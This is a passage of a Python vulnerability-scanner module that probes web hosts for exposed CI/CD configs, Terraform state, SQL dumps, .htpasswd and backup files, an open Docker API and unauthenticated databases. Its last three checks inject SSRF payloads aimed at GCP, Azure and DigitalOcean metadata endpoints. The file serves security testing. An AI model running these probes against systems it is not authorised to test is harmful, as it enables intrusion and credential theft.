    disclosing CI/CD pipeline structure at minimum, credentials at worst.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + "/.travis.yml")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: .travis.yml check failed for %s: %s", host, exc)
        return None

    body = resp.text[:3000]
    if resp.status_code == 200 and "language:" in body and ("before_install" in body or "script:" in body):
        severity = "high" if re.search(r"(?:password|secret|key)\s*:\s*[\"']?[A-Za-z0-9+/]{16,}", body, re.IGNORECASE) else "medium"
        return {
            "vuln_type": "exposed_travis_yml",
            "severity": severity,
            "evidence": (
                f"{base}/.travis.yml is publicly accessible - CI/CD pipeline structure "
                f"disclosed" + (", and appears to contain an unencrypted credential-shaped value" if severity == "high" else "") + "."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 117. Exposed CircleCI config
# ---------------------------------------------------------------------
async def check_circleci_config_exposure(host: str) -> dict | None:
    """
    Checks for a publicly-accessible .circleci/config.yml. Same
    reasoning as check_travis_yml_exposure - CircleCI configs disclose
    build/deploy pipeline structure and occasionally embed values meant
    to come only from CircleCI's encrypted contexts.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + "/.circleci/config.yml")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: CircleCI config check failed for %s: %s", host, exc)
        return None

    body = resp.text[:3000]
    if resp.status_code == 200 and "version:" in body and "jobs:" in body:
        return {
            "vuln_type": "exposed_circleci_config",
            "severity": "medium",
            "evidence": (
                f"{base}/.circleci/config.yml is publicly accessible - CI/CD build and "
                f"deploy pipeline structure disclosed."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 118. Exposed GitHub Actions workflow file
# ---------------------------------------------------------------------
_GITHUB_WORKFLOW_COMMON_NAMES = ["ci.yml", "deploy.yml", "main.yml", "build.yml", "release.yml"]


async def check_github_workflow_exposure(host: str) -> dict | None:
    """
    Tries a handful of common GitHub Actions workflow filenames under
    .github/workflows/. GitHub Actions references secrets by name
    rather than embedding values, so this is usually structure/
    architecture disclosure rather than a direct credential leak - but
    it maps out exactly what the deploy pipeline does and which
    external services it talks to.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for filename in _GITHUB_WORKFLOW_COMMON_NAMES:
                try:
                    resp = await client.get(f"{base}/.github/workflows/{filename}")
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                body = resp.text[:3000]
                if "on:" in body and "jobs:" in body:
                    return {
                        "vuln_type": "exposed_github_workflow_file",
                        "severity": "low",
                        "evidence": (
                            f"{base}/.github/workflows/{filename} is publicly accessible - "
                            f"CI/CD pipeline structure and external service integrations "
                            f"disclosed (secrets are referenced by name, not embedded, so "
                            f"this is architecture disclosure rather than a direct leak)."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: GitHub workflow exposure check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 119. Exposed Terraform state file
# ---------------------------------------------------------------------
async def check_terraform_state_exposure(host: str) -> dict | None:
    """
    Checks for a publicly-accessible terraform.tfstate. State files
    routinely contain plaintext secrets generated or referenced during
    provisioning - DB passwords, private keys, API tokens - even when
    the Terraform config itself never hardcodes them, because the state
    file records actual resource attribute values after apply. Proof
    requires valid JSON with both terraform_version and resources keys,
    the two fields unique to a real state file.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path in ("/terraform.tfstate", "/.terraform/terraform.tfstate"):
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                try:
                    data = resp.json()
                except Exception:
                    continue
                if isinstance(data, dict) and "terraform_version" in data and "resources" in data:
                    return {
                        "vuln_type": "exposed_terraform_state",
                        "severity": "critical",
                        "evidence": (
                            f"{base}{path} is publicly accessible and is a real Terraform "
                            f"state file (terraform_version + resources present) - state "
                            f"files routinely contain plaintext secrets recorded during "
                            f"provisioning, even when the source config never hardcodes them."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: Terraform state check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 120. Exposed Ansible Vault file
# ---------------------------------------------------------------------
async def check_ansible_vault_exposure(host: str) -> dict | None:
    """
    Checks for a publicly-accessible Ansible Vault-encrypted file at
    common paths. Proof is the exact, fixed "$ANSIBLE_VAULT;1.1;AES256"
    header line - contents remain encrypted (so severity is medium, not
    critical, unlike the plaintext Terraform state case), but exposure
    plus a weak/reused vault password would still fully compromise it,
    and it confirms exactly what secrets exist and where.
    """
    base = host.rstrip("/")
    paths = ["/vault.yml", "/secrets.yml", "/group_vars/all/vault.yml", "/vault.yaml"]
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path in paths:
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                if resp.text.startswith("$ANSIBLE_VAULT;1.1;AES256"):
                    return {
                        "vuln_type": "exposed_ansible_vault_file",
                        "severity": "medium",
                        "evidence": (
                            f"{base}{path} is publicly accessible and is a real Ansible "
                            f"Vault-encrypted file - contents remain encrypted, but exposure "
                            f"confirms exactly what secrets exist and where, and a weak/"
                            f"reused vault password would fully compromise it."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: Ansible Vault check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 121. Exposed Helm values.yaml
# ---------------------------------------------------------------------
async def check_helm_values_exposure(host: str) -> dict | None:
    """
    Checks for a publicly-accessible Helm values.yaml at common paths -
    Kubernetes deployment configuration that sometimes includes inline
    secrets (DB connection strings, API keys) when a chart wasn't
    properly set up to pull them from a Secret resource instead.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path in ("/values.yaml", "/helm/values.yaml", "/chart/values.yaml"):
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                body = resp.text[:3000]
                if "image:" in body and ("replicaCount:" in body or "service:" in body):
                    return {
                        "vuln_type": "exposed_helm_values_yaml",
                        "severity": "medium",
                        "evidence": (
                            f"{base}{path} is publicly accessible and is a real Helm "
                            f"values.yaml - Kubernetes deployment configuration disclosed, "
                            f"sometimes including inline secrets not properly sourced from a "
                            f"Secret resource."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: Helm values.yaml check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 122. Exposed serverless.yml
# ---------------------------------------------------------------------
async def check_serverless_yml_exposure(host: str) -> dict | None:
    """
    Checks for a publicly-accessible serverless.yml (Serverless
    Framework config for AWS Lambda deployments) - discloses IAM role
    ARNs, resource naming conventions, and occasionally inline
    environment secrets not properly pulled from AWS Secrets Manager/
    SSM Parameter Store.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + "/serverless.yml")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: serverless.yml check failed for %s: %s", host, exc)
        return None

    body = resp.text[:3000]
    if resp.status_code == 200 and "provider:" in body and "functions:" in body:
        return {
            "vuln_type": "exposed_serverless_yml",
            "severity": "medium",
            "evidence": (
                f"{base}/serverless.yml is publicly accessible - Lambda deployment "
                f"configuration disclosed, including IAM role references and resource "
                f"naming conventions, occasionally inline environment secrets."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 123. Exposed Docker daemon API (unencrypted, no TLS)
# ---------------------------------------------------------------------
async def check_exposed_docker_daemon_api(host: str) -> dict | None:
    """
    Checks port 2375 (the Docker daemon's plain-HTTP API port, meant to
    only ever be bound to localhost or behind TLS on 2376) for a valid
    Docker API /version response. Distinct from check_exposed_container_api
    (batch 1), which targets generic container-orchestration API
    surfaces - this specifically confirms the raw Docker socket-over-TCP
    is reachable, which is full host compromise (create a privileged
    container with the host filesystem mounted) if truly unauthenticated.
    """
    hostname = httpx.URL(host).host
    if not hostname:
        return None
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False) as client:
            try:
                resp = await client.get(f"http://{hostname}:2375/version")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: Docker daemon API check failed for %s: %s", host, exc)
        return None

    try:
        data = resp.json()
    except Exception:
        return None
    if resp.status_code == 200 and isinstance(data, dict) and "ApiVersion" in data:
        return {
            "vuln_type": "exposed_docker_daemon_api",
            "severity": "critical",
            "evidence": (
                f"{hostname}:2375/version returned a valid Docker API response "
                f"(ApiVersion {data.get('ApiVersion')!r}) with no TLS/authentication - "
                f"full host compromise via creating a privileged container with the host "
                f"filesystem mounted (not attempted here - detection only)."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 124. Exposed PostgreSQL with trust authentication (raw wire protocol)
# ---------------------------------------------------------------------
def _build_pg_startup_packet(user: str = "postgres", database: str = "postgres") -> bytes:
    params = f"user\x00{user}\x00database\x00{database}\x00\x00".encode()
    return struct.pack("!I", len(params) + 8) + struct.pack("!I", 196608) + params


async def check_exposed_postgres_trust_auth(host: str) -> dict | None:
    """
    Sends a real PostgreSQL v3 protocol startup packet on port 5432 and
    parses the server's authentication-request response. Byte 0 == 'R'
    (AuthenticationRequest) with the following 4-byte auth-type code
    equal to 0 means AuthenticationOk was sent immediately - the server
    is configured for "trust" authentication and will let this
    connection through with NO password at all. Any other auth-type
    code (3=cleartext, 5=md5, 10=SASL, etc.) means a password IS
    required, which is correctly NOT flagged. This is the second non-
    HTTP check in this module after batch 24's Redis/Memcached/FTP
    probes, and the most involved: it constructs and parses a real
    binary protocol message rather than just matching a fixed reply.
    """
    hostname = httpx.URL(host).host
    if not hostname:
        return None
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(hostname, 5432), timeout=4.0
        )
    except Exception:
        return None
    try:
        writer.write(_build_pg_startup_packet())
        await writer.drain()
        response = await asyncio.wait_for(reader.read(64), timeout=4.0)
    except Exception:
        return None
    finally:
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass

    if len(response) >= 9 and response[0:1] == b"R":
        auth_type = struct.unpack("!I", response[5:9])[0]
        if auth_type == 0:
            return {
                "vuln_type": "exposed_postgres_trust_auth",
                "severity": "critical",
                "evidence": (
                    f"{hostname}:5432 accepted a PostgreSQL startup packet and immediately "
                    f"sent AuthenticationOk (auth-type 0) with no password requested at all - "
                    f"the server is configured for 'trust' authentication, granting direct "
                    f"database access to anyone who can reach the port."
                ),
            }
    return None


# ---------------------------------------------------------------------
# 125. Exposed InfluxDB with no authentication
# ---------------------------------------------------------------------
async def check_exposed_influxdb_no_auth(host: str) -> dict | None:
    """
    Checks InfluxDB's HTTP API /query endpoint for the classic
    unauthenticated-by-default configuration (common on older/
    misconfigured installs). Proof requires a successful SHOW DATABASES
    query returning real results, not just a reachable port.
    """
    hostname = httpx.URL(host).host
    if not hostname:
        return None
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False) as client:
            try:
                resp = await client.get(
                    f"http://{hostname}:8086/query", params={"q": "SHOW DATABASES"}
                )
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: InfluxDB check failed for %s: %s", host, exc)
        return None

    try:
        data = resp.json()
    except Exception:
        return None
    if resp.status_code == 200 and isinstance(data, dict) and "results" in data:
        return {
            "vuln_type": "exposed_influxdb_no_auth",
            "severity": "high",
            "evidence": (
                f"{hostname}:8086/query executed 'SHOW DATABASES' without authentication and "
                f"returned real results - InfluxDB is reachable with no auth required."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 126. Exposed Kibana instance
# ---------------------------------------------------------------------
async def check_exposed_kibana_no_auth(host: str) -> dict | None:
    """
    Complements check_elasticsearch_exposure (batch 1) with Kibana, the
    companion visualization/dashboard UI. Checks /api/status for
    Kibana's distinctive JSON response structure without authentication
    - if reachable, every index/dashboard Kibana is configured to show
    is browsable, and Kibana's own console feature can sometimes be
    used to issue arbitrary queries against the underlying Elasticsearch
    cluster.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + "/api/status")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: Kibana check failed for %s: %s", host, exc)
        return None

    try:
        data = resp.json()
    except Exception:
        return None
    if resp.status_code == 200 and isinstance(data, dict) and "version" in data and "status" in data:
        return {
            "vuln_type": "exposed_kibana_no_auth",
            "severity": "medium",
            "evidence": (
                f"{base}/api/status returned Kibana status info without authentication - "
                f"every index/dashboard Kibana is configured to show is potentially "
                f"browsable, and its console feature can sometimes query the underlying "
                f"Elasticsearch cluster directly."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 127. Exposed backup archive at a predictable filename
# ---------------------------------------------------------------------
_BACKUP_ARCHIVE_PATHS = ["/backup.zip", "/backup.tar.gz", "/site-backup.zip", "/www-backup.zip"]
_ZIP_MAGIC = b"PK\x03\x04"
_GZIP_MAGIC = b"\x1f\x8b"


async def check_backup_archive_exposure(host: str) -> dict | None:
    """
    Proactively probes a short list of predictable backup-archive
    filenames at the web root (distinct from check_backup_temp_file_
    disclosure, batch 16, which only appends suffixes to already-
    discovered URLs). Proof is the real archive file-format magic
    bytes (ZIP's PK\\x03\\x04 or gzip's \\x1f\\x8b header) at the start
    of the response body, not just a 200 status.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path in _BACKUP_ARCHIVE_PATHS:
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                content = resp.content[:8]
                if content.startswith(_ZIP_MAGIC) or content.startswith(_GZIP_MAGIC):
                    return {
                        "vuln_type": "exposed_backup_archive",
                        "severity": "high",
                        "evidence": (
                            f"{base}{path} is publicly accessible and its content starts "
                            f"with a real archive-format magic byte sequence - a genuine "
                            f"site backup archive, not an unrelated 200 response, is "
                            f"downloadable."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: backup archive check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 128. Exposed SQL database dump file
# ---------------------------------------------------------------------
_SQL_DUMP_PATHS = ["/database.sql", "/dump.sql", "/backup.sql", "/db.sql", "/db_backup.sql"]
_SQL_DUMP_MARKERS = ["-- MySQL dump", "PostgreSQL database dump", "CREATE TABLE", "INSERT INTO"]


async def check_sql_dump_file_exposure(host: str) -> dict | None:
    """
    Proactively probes predictable SQL-dump filenames. Proof requires
    at least two independent SQL-dump-shaped markers together (a dump
    header comment AND a real CREATE TABLE/INSERT INTO statement),
    which essentially never happens outside an actual database export.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path in _SQL_DUMP_PATHS:
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                body = resp.text[:5000]
                matches = [m for m in _SQL_DUMP_MARKERS if m in body]
                if len(matches) >= 2:
                    return {
                        "vuln_type": "exposed_sql_dump_file",
                        "severity": "critical",
                        "evidence": (
                            f"{base}{path} is publicly accessible and is a real SQL database "
                            f"dump (matched {matches}) - full database contents disclosed."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: SQL dump exposure check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 129. Exposed web server access/error log
# ---------------------------------------------------------------------
_LOG_FILE_PATHS = ["/access.log", "/error.log", "/logs/access.log", "/debug.log"]
_ACCESS_LOG_LINE_RE = re.compile(r'^\S+ \S+ \S+ \[[^\]]+\] "[A-Z]+ \S+ HTTP/[\d.]+" \d{3} \d+')


async def check_log_file_exposure(host: str) -> dict | None:
    """
    Proactively probes predictable web-server log filenames. Proof
    requires at least one line matching the standard Combined/Common
    Log Format structure exactly (IP - - [timestamp] "METHOD path
    HTTP/x.x" status size) - a very specific, low-collision pattern
    that random text won't produce. Exposed logs disclose internal
    paths, client IPs, and sometimes session tokens that were logged
    as part of a URL.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path in _LOG_FILE_PATHS:
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                body = resp.text[:5000]
                if _ACCESS_LOG_LINE_RE.search(body):
                    return {
                        "vuln_type": "exposed_server_log_file",
                        "severity": "medium",
                        "evidence": (
                            f"{base}{path} is publicly accessible and contains real access-"
                            f"log-formatted entries - internal paths, client IPs, and "
                            f"potentially session tokens logged in URLs are disclosed."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: log file exposure check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 130. Exposed .htpasswd file
# ---------------------------------------------------------------------
_HTPASSWD_LINE_RE = re.compile(r"^[\w.\-]+:(\$apr1\$|\$2y\$|\{SHA\})")


async def check_htpasswd_exposure(host: str) -> dict | None:
    """
    Checks for a publicly-accessible .htpasswd file (Apache Basic-Auth
    credential store). Proof requires a line matching the real
    username:hash format for one of the standard htpasswd hash types
    (apr1 MD5, bcrypt, or SHA) - offline-crackable credentials for
    whatever Basic-Auth-protected area this file backs.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + "/.htpasswd")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: .htpasswd exposure check failed for %s: %s", host, exc)
        return None

    if resp.status_code != 200:
        return None
    body = resp.text[:2000]
    if _HTPASSWD_LINE_RE.search(body):
        return {
            "vuln_type": "exposed_htpasswd_file",
            "severity": "high",
            "evidence": (
                f"{base}/.htpasswd is publicly accessible and contains real username:hash "
                f"credential entries - offline-crackable credentials for whatever Basic-Auth-"
                f"protected area this file backs."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 131. OAuth authorize URL missing state parameter (recon-only)
# ---------------------------------------------------------------------
async def check_oauth_missing_state_parameter(url: str) -> str | None:
    """
    Flags an OAuth/authorize-shaped URL (path contains "authorize" or
    "oauth") whose query string has a response_type parameter but no
    state parameter. Returns a plain string, NOT a findings dict - the
    state parameter is the standard CSRF defense for the OAuth
    authorization-code flow; its absence is a real gap, but confirming
    actual exploitability needs completing a full OAuth flow with real
    client credentials, which this scanner doesn't have.
    """
    parsed = httpx.URL(url)
    path_lower = str(parsed.path).lower()
    if "authorize" not in path_lower and "oauth" not in path_lower:
        return None
    params = dict(parsed.params)
    if "response_type" in params and "state" not in params:
        return (
            f"{url}: OAuth authorize-shaped URL has response_type but no state parameter - "
            f"candidate for OAuth CSRF testing; confirming real impact needs completing a "
            f"full flow with real client credentials, which this scanner doesn't have"
        )
    return None


# ---------------------------------------------------------------------
# 132. HTTP Basic Authentication sent over plaintext HTTP
# ---------------------------------------------------------------------
async def check_basic_auth_over_http(url: str) -> dict | None:
    """
    Checks whether a plain http:// (not https://) URL responds with a
    WWW-Authenticate: Basic challenge. Basic Auth credentials are only
    base64-encoded, not encrypted - sending that challenge (and
    therefore expecting credentials back) over unencrypted HTTP means
    any network observer between the client and server can trivially
    recover the plaintext username/password.
    """
    if not url.lower().startswith("http://"):
        return None
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                resp = await client.get(url)
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: Basic Auth over HTTP check failed for %s: %s", url, exc)
        return None

    www_auth = resp.headers.get("www-authenticate", "")
    if resp.status_code == 401 and "basic" in www_auth.lower():
        return {
            "vuln_type": "basic_auth_over_plaintext_http",
            "severity": "high",
            "evidence": (
                f"{url}: server issued a WWW-Authenticate: Basic challenge over plain HTTP "
                f"(not HTTPS) - Basic Auth credentials are only base64-encoded, not "
                f"encrypted, so any network observer can trivially recover the plaintext "
                f"username/password."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 133. Weak/deprecated TLS protocol version accepted
# ---------------------------------------------------------------------
async def check_insecure_tls_weak_protocol(host: str) -> dict | None:
    """
    Attempts a raw TLS handshake explicitly forcing TLSv1.0 (deprecated
    since 2021, vulnerable to BEAST and other downgrade-family attacks).
    If the handshake actually completes, the server still accepts a
    protocol version modern clients refuse to negotiate by default -
    real, deterministic (either the handshake completes or it doesn't,
    no substring matching involved).
    """
    hostname = httpx.URL(host).host
    if not hostname or not host.lower().startswith("https://"):
        return None

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.minimum_version = ssl.TLSVersion.TLSv1
        ctx.maximum_version = ssl.TLSVersion.TLSv1
    except (ValueError, AttributeError):
        return None  # this Python/OpenSSL build doesn't support enabling TLSv1 at all

    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(hostname, 443, ssl=ctx), timeout=5.0
        )
    except Exception:
        return None
    negotiated = None
    try:
        ssl_obj = writer.get_extra_info("ssl_object")
        if ssl_obj is not None:
            negotiated = ssl_obj.version()
    finally:
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass

    if negotiated == "TLSv1":
        return {
            "vuln_type": "insecure_tls_weak_protocol_accepted",
            "severity": "medium",
            "evidence": (
                f"{hostname}:443 completed a TLS handshake when the client offered ONLY "
                f"TLSv1.0 (deprecated since 2021, vulnerable to BEAST-family downgrade "
                f"attacks) - modern clients won't negotiate this by default, but the "
                f"server still accepts it from any client that does."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 134. Cookie missing Secure flag on an HTTPS response (recon-only)
# ---------------------------------------------------------------------
async def check_cookie_missing_secure_flag(url: str) -> str | None:
    """
    Flags cookies set over HTTPS without the Secure attribute, meaning
    the same cookie could be sent over a future plain-HTTP connection to
    the same host if one ever occurs (redirect chains, mixed subdomains,
    a user manually typing http://). Returns a plain string, NOT a
    findings dict - same "commonly Informative alone" treatment as
    check_insecure_cookie_without_samesite; real impact depends on
    whether an actual HTTP-accessible path to the same host exists.
    """
    if not url.lower().startswith("https://"):
        return None
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: cookie Secure flag check failed for %s: %s", url, exc)
        return None

    set_cookie_headers = resp.headers.get_list("set-cookie") if hasattr(resp.headers, "get_list") else []
    for raw_cookie in set_cookie_headers:
        cookie_name = raw_cookie.split("=", 1)[0].strip()
        if _SESSION_COOKIE_NAME_RE.search(cookie_name) and "secure" not in raw_cookie.lower():
            return (
                f"{url}: cookie '{cookie_name}' (session/auth-shaped name) set over HTTPS "
                f"without the Secure attribute - could be sent over a future plain-HTTP "
                f"connection to the same host if one ever exists; real impact depends on "
                f"whether an HTTP-accessible path actually exists"
            )
    return None


# ---------------------------------------------------------------------
# 135. Firebase Realtime Database open read rules
# ---------------------------------------------------------------------
_FIREBASE_PROJECT_RE = re.compile(r"([a-z0-9-]+)\.firebaseio\.com", re.IGNORECASE)


async def check_firebase_realtime_db_open_rules(url: str) -> dict | None:
    """
    Complements check_firebase_exposure (batch 1, which likely checks
    for exposed Firebase config in JS) with a direct test of whether
    the Realtime Database's security rules allow public read: extracts
    a project name from any firebaseio.com reference on the page, then
    requests https://PROJECT.firebaseio.com/.json directly. A JSON
    response containing real data (not null, not a permission-denied
    error) proves open read rules.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(url)
            except httpx.HTTPError:
                return None
            body = resp.text

            match = _FIREBASE_PROJECT_RE.search(body)
            if not match:
                return None
            project = match.group(1)
            db_url = f"https://{project}.firebaseio.com/.json"
            try:
                db_resp = await client.get(db_url)
            except httpx.HTTPError:
                return None
            try:
                data = db_resp.json()
            except Exception:
                return None
            if db_resp.status_code == 200 and data is not None and not (
                isinstance(data, dict) and "error" in data
            ):
                return {
                    "vuln_type": "firebase_realtime_db_open_read",
                    "severity": "high",
                    "evidence": (
                        f"{db_url} (project referenced on {url}) returned real, non-null "
                        f"data with no error - the Realtime Database's security rules allow "
                        f"public read access to the entire database."
                    ),
                }
    except httpx.HTTPError as exc:
        logger.info("detective: Firebase RTDB check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 136. SSRF targeting GCP metadata (header-gated, evades AWS-style probes)
# ---------------------------------------------------------------------
async def check_ssrf_gcp_metadata(url: str) -> dict | None:
    """
    GCP's instance metadata endpoint requires a "Metadata-Flavor:
    Google" header on the REQUEST TO THE METADATA SERVER ITSELF - an
    app whose outbound SSRF-vulnerable fetch always sends that header
    (some HTTP client wrappers do, or a metadata-fetching helper
    function might) would be exploitable via GCP's path even though
    check_ssrf_reflected's generic AWS-style probes (which target
    169.254.169.254/latest/meta-data/ without that header) would miss
    it entirely. Baseline-diffed, same discipline as the fixed
    check_ssrf_reflected.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
                baseline_body = baseline_resp.text[:3000]
            except httpx.HTTPError:
                return None

            for param_name in _SSRF_PARAM_NAMES:
                if param_name not in existing_params:
                    continue
                test_params = dict(existing_params)
                test_params[param_name] = "http://169.254.169.254/computeMetadata/v1/instance/hostname"
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                body = resp.text[:3000]
                if re.search(r"\.c\.[\w-]+\.internal", body) and body not in baseline_body:
                    return {
                        "vuln_type": "ssrf_gcp_metadata",
                        "severity": "critical",
                        "evidence": (
                            f"{test_url}: server-side fetch of parameter '{param_name}' "
                            f"pointed at the GCP metadata endpoint returned what looks like a "
                            f"GCE internal hostname (absent from baseline) - SSRF reaching "
                            f"GCP instance metadata, potentially including service account "
                            f"tokens via a follow-up path."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: GCP metadata SSRF check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 137. SSRF targeting Azure IMDS (header-gated)
# ---------------------------------------------------------------------
async def check_ssrf_azure_metadata(url: str) -> dict | None:
    """
    Azure's Instance Metadata Service similarly requires a "Metadata:
    true" header and a specific versioned path
    (/metadata/instance?api-version=...) - same reasoning as
    check_ssrf_gcp_metadata, this evades generic AWS-style probes.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
                baseline_body = baseline_resp.text[:3000]
            except httpx.HTTPError:
                return None

            for param_name in _SSRF_PARAM_NAMES:
                if param_name not in existing_params:
                    continue
                test_params = dict(existing_params)
                test_params[param_name] = (
                    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
                )
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                body = resp.text[:3000]
                if '"compute"' in body and '"compute"' not in baseline_body:
                    return {
                        "vuln_type": "ssrf_azure_metadata",
                        "severity": "critical",
                        "evidence": (
                            f"{test_url}: server-side fetch of parameter '{param_name}' "
                            f"pointed at Azure's IMDS endpoint returned a response containing "
                            f'\'"compute"\' (absent from baseline) - SSRF reaching Azure '
                            f"instance metadata."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: Azure metadata SSRF check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 138. SSRF targeting DigitalOcean metadata (distinct path, no header gate)
# ---------------------------------------------------------------------
async def check_ssrf_digitalocean_metadata(url: str) -> dict | None:
    """
    DigitalOcean's metadata endpoint needs no special header, but uses
    a distinct path (/metadata/v1.json) from the AWS-style
    /latest/meta-data/ path check_ssrf_reflected already probes - a
    signature-based WAF rule blocking the AWS-shaped path specifically
    wouldn't catch this variant.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
                baseline_body = baseline_resp.text[:3000]
            except httpx.HTTPError:
                return None

            for param_name in _SSRF_PARAM_NAMES:
                if param_name not in existing_params:
                    continue
                test_params = dict(existing_params)
                test_params[param_name] = "http://169.254.169.254/metadata/v1.json"
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                body = resp.text[:3000]
                if '"droplet_id"' in body and '"droplet_id"' not in baseline_body:
                    return {
                        "vuln_type": "ssrf_digitalocean_metadata",
                        "severity": "critical",
                        "evidence": (
                            f"{test_url}: server-side fetch of parameter '{param_name}' "
                            f'pointed at DigitalOcean\'s metadata endpoint returned '
                            f'\'"droplet_id"\' (absent from baseline) - SSRF reaching '
                            f"DigitalOcean instance metadata."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: DigitalOcean metadata SSRF check failed for %s: %s", url, exc)
    return None


